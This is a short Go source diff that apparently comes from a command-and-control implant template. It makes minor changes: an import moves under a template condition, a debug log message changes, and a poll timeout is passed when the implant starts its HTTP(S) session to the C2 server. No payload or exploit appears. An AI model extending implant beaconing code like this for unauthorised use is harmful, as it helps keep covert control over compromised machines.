@@ -25,6 +25,10 @@ import (
 	"net"
 	// {{end}}
 
+	// {{if or .Config.MTLSc2Enabled .Config.WGc2Enabled}}
+	"strconv"
+	// {{end}}
+
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
@@ -55,7 +59,6 @@ import (
 
 	"io"
 	"net/url"
-	"strconv"
 	"sync"
 	"time"
 
@@ -243,7 +246,7 @@ func StartConnectionLoop() *Connection {
 
 		reconnect := GetReconnectInterval()
 		// {{if .Config.Debug}}
-		log.Printf("Sleep %d second(s) ...", reconnect/time.Second)
+		log.Printf("Sleep %s ...", reconnect)
 		// {{end}}
 		time.Sleep(reconnect)
 	}
@@ -429,7 +432,8 @@ func httpConnect(c2URI *url.URL) (*Connection, error) {
 	log.Printf("Connecting -> http(s)://%s", c2URI.Host)
 	// {{end}}
 	proxyConfig := c2URI.Query().Get("proxy")
-	client, err := httpclient.HTTPStartSession(c2URI.Host, c2URI.Path, proxyConfig)
+	timeout := GetPollTimeout()
+	client, err := httpclient.HTTPStartSession(c2URI.Host, c2URI.Path, timeout, proxyConfig)
 	if err != nil {
 		// {{if .Config.Debug}}
 		log.Printf("http(s) connection error %v", err)
